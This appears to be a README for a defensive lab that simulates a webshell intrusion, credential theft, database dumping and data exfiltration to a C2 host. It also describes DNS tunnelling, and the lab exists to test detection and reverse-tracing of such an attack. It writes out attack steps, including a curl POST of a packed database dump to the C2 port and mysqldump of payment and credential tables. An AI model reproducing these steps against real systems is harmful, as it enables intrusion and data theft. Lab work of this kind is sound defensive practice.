# Data Exfiltration + C2 Communication Lab

> 数据外泄 + C2 通信 演练环境

## 覆盖场景

| 场景 | Skill | 说明 |
|------|-------|------|
| S7 | traceability-analysis | 从异常大流量反向追溯到 mysqldump → 凭证发现 |
| S7 | data-source-completeness | host_exec + host_connect 关联 |
| S5 部分 | risk-identification | WebShell RCE + DNS 隧道 |

## 拓扑

```
  攻击者 (Host)
      │ HTTP
      ▼
 ┌──────────┐  MySQL (3306)   ┌──────────┐
 │ 10.66.6.91│ ──────────────▶ │ 10.66.6.92│
 │ OpenEuler│  curl POST      │ CentOS 7 │
 │ Nginx+PHP│ ──────────────▶ │ MariaDB  │
 │ WebShell │  外传 :8443      │ C2 :8443 │
 └──────────┘                 └──────────┘
  文件上传漏洞                  MySQL + C2 监听
```

## 部署

```bash
# 在 92 上先执行 (MySQL + C2 需先就绪)
bash deploy-92.sh

# 在 91 上执行
bash deploy-91.sh
```

## 攻击流程

```bash
bash attack.sh                    # 默认目标
bash attack.sh 10.66.6.91 80       # 指定目标
```

### 攻击阶段

1. **正常流量**
2. **WebShell 植入** — .phtml 上传获得 RCE
3. **凭证发现** — 读取 `config/database.yml`
4. **DB 敏感查询** — SELECT users, payment_cards, credentials
5. **数据导出打包** — mysqldump → tar czf
6. **C2 心跳** — GET 到 92:8443
7. **数据外传** — curl POST 打包数据到 92:8443
8. **DNS 隧道模拟** — dig base64 编码子域名
9. **痕迹清理**
10. **攻击后正常流量**

### 反向追溯路径 (S7 核心)

```
检测点: 异常大流量 POST → 92:8443
  ↑ host_exec: curl --data-binary @/tmp/.data.tar.gz
  ↑ host_exec: tar czf /tmp/.data.tar.gz /tmp/.dump.sql
  ↑ host_exec: mysqldump → prod_db users payment_cards credentials
  ↑ host_connect: 91 → 92:3306 (nginx 子进程)
  ↑ host_exec: cat /var/www/html/exfil/config/database.yml
  └─ 结论: Web 漏洞 → 凭证发现 → DB 导出 → 外传
```

## 日志采集点

| 主机 | 日志路径 | 对应 SecWeaver 证据类型 |
|------|---------|----------------------|
| 91 | `/var/log/nginx/access.log` | web_access_log |
| 91 | `/opt/secweaver-agent/logs/audit-port-execmon.log` | host_exec, host_connect |
| 91 | `/opt/secweaver-agent/logs/syslog-risk-json.log` | syslog_risk_alert |
| 92 | `/var/log/c2-listener.log` | — (C2 接收) |
